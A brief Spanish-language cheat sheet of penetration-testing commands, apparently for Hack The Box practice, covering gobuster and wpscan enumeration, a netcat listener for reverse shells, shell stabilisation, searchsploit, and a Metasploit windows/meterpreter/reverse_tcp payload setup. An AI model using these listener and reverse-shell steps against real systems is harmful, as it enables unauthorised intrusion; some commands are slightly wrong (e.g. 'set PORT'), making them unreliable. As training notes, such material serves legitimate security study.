# apuntes_ciber
### Dirb Fuzzing

dirb url Gobuster gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium —url url

### Wordpress Scan

wpscan —url ip o url de la maquina -e vp.u

****TartarSauce htb****

wpscan —url ip —enumerate u

### Ponerme en escucha

nc -lvnp 443

### Tratamiento de la TTY

script /dev/null -c bash

ctrl Z  stty raw -echo;fg

reset xterm

export TERM=xterm

export SHELL=bash

### Searchsploit y Metasploit

searchsploit -m numero identificativo para mover el exploit 

msfdb run

use exploit es para usar el exploit

show option para ver lo que nos pide el exploit Set RHOSTS ip target

### Crear Listener con metasploit

set payload windows/meterpreter/reverse_tcp

set LHOST ip maquina

set PORT 4645

exploit
